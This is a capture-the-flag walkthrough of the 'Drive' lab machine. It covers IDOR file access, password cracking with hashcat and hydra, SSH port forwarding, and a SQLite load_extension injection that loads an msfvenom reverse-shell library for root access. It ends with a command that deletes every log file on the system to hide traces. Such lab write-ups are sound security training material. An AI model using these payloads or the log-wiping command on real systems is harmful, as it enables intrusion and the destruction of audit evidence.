# Machine Overview

Drive is a hard Linux machine featuring a file-sharing service susceptible to Insecure Direct Object Reference (IDOR). Through this vulnerability, a plaintext password is obtained, leading to SSH access to the **martin** user. Then, port forwarding is performed to gain access to a hardcoded password exposed in a **Gitea** repository, allowing decryption of encrypted database backups. Hashes within the backups are cracked, leading to access to another user, **tom**, on the system, who has access to a root-owned binary with the SUID bit set. The program is reverse-engineered, revealing the clear text password of user **moriarty**. The "Activate User Account" option is vulnerable to SQL injection, which leads to loading a malicious **.dll** to gain shell access as root.

## Scanning through Nmap
First of all we will go with nmap to scan the whole network and check for services running on the network. To scan the whole network and find all the open ports i use **-p-** used to scan the whole **65535** ports with **--min-rate 10000** to scan network faster from **nmap** and i found a list of open ports on the network and get only the open ports using different terminal tools like **cut**, **tr** etc. 

```shell
$ nmap -p--min-rate 10000 10.10.10.175 -oN ini.txt && cat ini.txt | cut  -d ' ' -f1 | tr -d '/tcp' | tr '\n' ','
22,80
```

Now Let's run the depth scan on these specific ports using 

```bash
$ nmap -p22,80 -sC -sV -A -T4 10.10.10.175 -oN scan.txt
```

**-sC** is to run all the default scripts
**-sV** for service and version detection
**-A** to check all default things
**-T4** for aggressive scan
**-oN** to write the result into a specified file

```nmap

```

 ## Information Gathering
 Through nmap we discover only two opened ports, **22 ssh** and **80 http**. On port 80 **ngnix 1.18.0** is running which is not vulnerable at that time and it is redirecting us to **drive.htb**. Let's add this to our local DNS file called `/etc/hosts` so that our browser can resolve that.
```bash
$ echo "10.10.11.235    drive.htb" | sudo tee -a /etc/hosts
10.10.11.235    drive.htb
```

### Port 80 HTTP
The website is about some kind of data storage drive where users can store, edit, and share files. Additionally, there is a login and register page for users to access the platform.

![[Pasted image 20240219201904.png]]

Let's check the website's technologies using Wappalyzer. According to Wappalyzer, the website is running on the Python Django framework at the backend.

![[Pasted image 20240219202045.png]]
  
As we discovered earlier, there is a register and login page. Let's create an account using the register page because we don't have any valid credentials yet. 

![[Pasted image 20240219202322.png]]

After logging into the account, there is a "Welcome_to_Doodle_drive!" file already present in our dashboard, and we can also upload our own files to the drive.

![[Pasted image 20240219203219.png]]

After uploading a file, we can see that it is stored on the drive with a number, which can be vulnerable to IDOR (Insecure Direct Object Reference). Let's capture this request in Burp Suite and try to find files between 1 to 112 because it gives our file number as 112. In the Intruder tab, set 112 as our targeting point and set the payload to numbers from 0 to 112.

![[Pasted image 20240219203857.png]]

We found 6 files with numbers 79, 98, 99, 100, 101, and 112

![[Pasted image 20240219204406.png]]

When I tried to access these files, it shows me a 401 unauthorized error. Interesting!

![[Pasted image 20240219204804.png]]

Let's fuzz that endpoint using **ffuf**, and we found six different endpoints with blocks that seem interesting due to their response code.

```bash
$ ffuf -u http://drive.htb/79/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

updates        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 222ms]
update         [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 223ms]
blocks         [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 216ms]
block          [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 238ms]
updated        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 217ms]
delete         [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 220ms]
```

We successfully accessed the content of file 79 on the block endpoint. There we found an email from Admin stating that he created a new user named **martin** with the password **Xk4@KjyrYv8t194L!**

![[Pasted image 20240219213206.png]]

We were also able to see the content of all other files using the block endpoint, and in the 101 file, we found the location of the database backup files on the system.

![[Pasted image 20240219213519.png]]

### Shell as Martin using SSH
  
Now that we have valid credentials for the user **martin**, let's get a shell using SSH.

![[Pasted image 20240219213724.png]]

Let's move to the `/var/www/backups` directory because it contains the database backup file.

![[Pasted image 20240219213916.png]]

Let's move all these backup files to our attacking machine. Since Python is present on the machine, I will be using a Python server for data exfiltration.

![[Pasted image 20240219214236.png]]

![[Pasted image 20240219214304.png]]

All these backup files are password-protected, and Martin's password didn't work to extract them.

![[Pasted image 20240220100829.png]]

In the `db.sqlite3` file, we found some users and their password hashes, which can be used to perform a dictionary attack to find the clear text password.

```bash
$ sqlite> select * from accounts_customuser;
21|sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a|2022-12-26 05:48:27.497873|0|jamesMason|||jamesMason@drive.htb|0|1|2022-12-23 12:33:04

```

User List:
- jamesMason@drive.htb
- martin@drive.htb
- tom@drive.htb
- cris@drive.htb
- admin@drive.htb
  
Let's save all these hashes in a file called "hashes".

```bash
$ cat hash
sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a

sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3
```

Because the backend was Django-based, we will use hashcat with the Django (SHA1) mode.

![[Pasted image 20240219215306.png]]

Hashcat cracked the hash of user Tom in a very short time, and the password is **john316**.

```bash
$ hashcat -m 124 hash rockyou.txt

Dictionary cache hit:
* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921508
* Keyspace..: 14344385

sha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004:john316
```

Let's try to gain shell as the Tom user using SSH, but it didn't accept that password. I also performed a password spray attack to check if any other user have the same password, but that also didn't work here. Interesting!

![[Pasted image 20240219220006.png]]

### Port Forwarding from martin user
  
When Tom's password didn't work and all the other backup files were encrypted, I moved back to Martin's shell and started enumerating it. Using netstat, I discovered that something is running on port 3000.

```bash
$ netstat -ant
Active Internet connections (servers and established)
| Proto | Recv-Q | Send-Q | Local Address     | Foreign Address  | State       |

| tcp6  | 0      | 0      | :::3000           | :::*             | LISTEN      |
```

**-a** to display all sockets
**-n** to don't resolve names
**-t** to restricts output to TCP connections.

Let's forward that port to our attacking machine and check what's running on it. **Port forwarding** is a process that gives someone outside of your network access to an application, program, or device within your private network. It’s otherwise known as **port mapping** or **port tunneling**. In the simplest terms, port forwarding allows other people on the internet to connect to you. You can learn more about port forwarding [here](https://zakaria17.medium.com/linux-privilege-escalation-through-local-and-remote-port-forwarding-with-ssh-51c7187495dc).

```bash
$ ssh -L 3000:127.0.0.1:3000  martin@drive.htb
```

**-L** for local

![[Pasted image 20240219221928.png]]

Now go to the browser and check what's running on `127.0.0.1:3000`. Gitea is running on the local port 3000 of the Martin user.
**Gitea** is a forge software package for hosting software development version control using Git as well as other collaborative features like bug tracking, code review, continuous integration, kanban boards, tickets, and wikis. It supports self-hosting but also provides a free public first-party instance.

![[Pasted image 20240219222029.png]]

Let's login into Gitea using **Martin's** user credentials. After logging into Martin's account, we are able to access the DoodleGrive repository, which includes some interesting files like **db_backup.sh**.

![[Pasted image 20240220101223.png]]

This `db_backup.sh` file includes passwords for encrypted database files. `H@ckThisP@ssW0rDIfY0uC@n:)`

![[Pasted image 20240220101415.png]]

Let's decrypt all the database files and extract data from them. I'll extract all the password hashes and store them in a file called "hash" so that I can perform a rainbow attack to find clear text passwords.

![[Pasted image 20240220102549.png]]

### Hashcat

Let's crack the hashes using hashcat with the same command we used before.

```bash
$ hashcat -m 124 hash rockyou.txt

Dictionary cache hit:
* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921508
* Keyspace..: 14344385

sha1$Ri2bP6RVoZD5XYGzeYWr7c$71eb1093e10d8f7f4d1eb64fa604e6050f8ad141:johniscool
sha1$DhWa3Bym5bj9Ig73wYZRls$3ecc0c96b090dea7dfa0684b9a1521349170fc93:john boy
sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a:johnmayer7
```

Again, we were able to crack the hash of Tom's user account, but this time we were able to find three more different passwords. Let's try them and check which one will work for us.
```bash
$ cat pass.txt 
johniscool
john boy
johnmayer7
john316
```

### Hydra
Hydra is an open-source parallelized login cracker that allows us to perform various kinds of brute force or dictionary attacks using wordlists. 
- tom : johnmayer7

```bash
$ hydra -l tom -P pass.txt drive.htb ssh

[22][ssh] host: drive.htb   login: tom   password: johnmayer7
1 of 1 target successfully completed, 1 valid password found
```

**-l** for username
**-P** for password list
**ssh** to attack on secure shell service

### Shell as Tom

Let's log in to the Tom user account using the password **johnmayer7**.

![[Pasted image 20240220103647.png]]

# Privilege Escalation

Let's move towards Privilege Escalation and check what we have in our user directory. 

![[Screenshot from 2023-10-20 12-07-21 1.png]]

There is a file named `doodleGrive-cli` with the +S permission set, which allows it to be executed by any member present in the group. In our case, both root and tom can execute this file, which caught my interest. To examine this file, let's download it to our attacker machine. We can use **scp** or run a **Python server** on the victim machine to download it. First, let's check if we have Python installed on the victim machine by running **python3 --version**, and we have Python installed on the victim machine.

![[Pasted image 20231020121240.png]]

To run the Python server, use the command `python3 -m http.server`. Here, the `-m` option is used to specify the module. Then, on our attacker machine, run `wget http://drive.htb:8000/doodleGrive-cli` to download it to our local machine.

![[Screenshot from 2023-10-20 12-21-23.png]]

Great! Now that you have the file `doodleGrive-cli` on your local machine, you can examine it further. Running the `file` command on it indicates that it is an ELF (Executable and Linkable Format) file, which is a common file format for executable files in Linux-like operating systems. This suggests that it is indeed an executable file. You can proceed to analyze its contents or properties further to understand its functionality.

![[Screenshot from 2023-10-20 12-26-37.png]]

When I ran it, the binary prompted for a username and password. I attempted to use both the **tom** and **martin** usernames and passwords that we discovered earlier, but they didn't work.

![[Screenshot from 2023-10-20 12-30-06.png]]

Let's run our beloved **Ghidra** (Ghidra is a reverse engineering and malware analysis tool developed by the NSA) to analyze the file and determine its functionality. To learn more about Ghidra, you can check out [this playlist](https://www.youtube.com/playlist?list=PLKwUZp9HwWoB6kWyA_Nr3nWIMJLxpt5UC) on YouTube for the basics. Our project has been created and the file has been imported, so let's proceed with the analysis.

First, I navigate to the main function to examine what the program is doing. I found some hard-coded credentials, which may be the username and password required for the program to start its processing. Additionally, I noticed that the **setuid** and **setgid** are both set to 0, which means that whenever the program runs, it will execute as the superuser because only the root user has **uid** and **gid** set to **0**.
- Username : moriarty
- Password  : findMeIfY0uC@nMr.Holmz!
Let's utilize these credentials to log in and explore the program further. Within the program, there are six options available:

1. Show user list
2. Show groups
3. Check server health
4. Show server request log
5. Activate user account
6. Exit

![[Screenshot from 2023-10-20 12-48-13.png]]

Let's explore the `activate_user_account` function further to see how we can exploit this vulnerability. It seems that the input provided by the user is directly used in a SQL query without proper sanitization, making it vulnerable to SQL injection attacks. We observed that using a single quote does not produce an error, but using a double quote does, indicating a potential SQL injection vulnerability. 

![[Screenshot from 2023-10-20 15-52-55.png]]

Because we already have all the user information, using SQL injection to read database credentials isn't a good choice. So let's start googling. After some research, I found [this](https://sqlite.org/loadext.html) link. It seems we can load a .dll file through a SQLite query.

Now that we know SQLite has a built-in function called **load_extension()** to load extensions, we can exploit this feature by creating a **.so** (shared object) file. Since the program sets **uid** and **gid** to 0 when it starts, we'll create a reverse shell file using **msfvenom**. This way, when the program attempts to load the extension file, it will load our reverse shell file with root privileges, granting us a root shell.

To do this, we first need to create a .so file and then place it in the directory where the doodleGrive-cli is located. This is because the program will attempt to load the extension file from the directory where the **doodleGrive-cli** file is present.

Let's begin the process by creating a .so file using **msfvenom**: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f elf-so -o a.so`. We'll name the file **a.so** to keep it short due to character limitations.
-  **-p** is for payload
- **-f** for format 
- **-o** for output file name
Our file is successfully created, and now we need to upload it to the victim machine. We have two options: using a **Python server** or **scp**. Earlier, we used the Python3 server method. Now, let's use the scp method so we can learn about both techniques. For this, we'll use the command `scp a.so tom@drive.htb:/home/tom`.
- **a.so** is our file name
- tom@drive.htb is target user ssh 
- **:/home/tom** is a path in which we want to upload our file
		
![[Screenshot from 2023-10-20 16-37-44.png]]

Now, we can see that our file is present in the doodleGrive-cli directory. We need to start a listener on port **9001**, which we specified in our reverse shell, so that we can receive our shell back when the doodleGrive-cli runs and calls our a.so file. To start the listener, we will use **netcat**: `nc -lvnp 9001`.
-  **-l** for listen
- **-v** for verbosity
- **-n** for numeric-only IP addresses
- **-p** for port number

![[Screenshot from 2023-10-20 16-43-49.png]]

Let's try to exploit it. We will use `"+load_extension(./a)--`. We use only **a** because **sqlite3** embeds .so from itself with every extension file. After trying, we come to know that there is a filter which replaces **/** with **none**.

![[Screenshot from 2023-10-20 16-59-52.png]]

Let's try to obfuscate it using the **char** function. The CHAR function converts decimal values to their corresponding ASCII characters. So, we will write the char value of **.**, **/**, **a**, which are **46** for **.**, **47** for **/**, and **97** for **a**. Now let's create the payload again, which will become `"+load_extension(char(46,47,97))--`, and try to see what happens next. As soon as we run the query, we get a shell as **root** on our listener.

![[Screenshot from 2023-10-20 17-08-47.png]]

Now Let's Delete all the logs on victim machine to remove footprints using `find / -name "*.log" -delete` 
- here **/** telling find to start from root directory and search in whole filesystem
- **-name** to find file with the specific pattern 
- **-delete** telling the find to delete all the files which match the specific pattern
